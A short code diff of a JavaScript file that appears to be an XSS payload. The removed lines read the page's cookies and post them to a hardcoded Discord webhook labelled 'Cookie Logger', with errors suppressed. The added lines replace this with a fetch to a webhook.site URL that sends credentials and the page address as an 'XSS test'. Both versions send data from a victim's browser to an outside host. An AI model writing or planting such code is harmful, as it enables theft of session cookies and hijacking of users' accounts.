@@ -1,16 +1,6 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb';
-
-const cookies = document.cookie;
-
-fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-        content: `**쿠키 정보:**\n\`\`\`\n${cookies}\n\`\`\``,
-        username: 'Cookie Logger'
-    })
-})
-.catch(() => {});
-alert('hello');
+fetch('https://webhook.site/3e4d431e-387c-4df7-b2d6-3db80395504c', {
+  method: 'POST',
+  mode: 'no-cors',
+  credentials: 'include',
+  body: 'XSS test from ' + location.href
+});
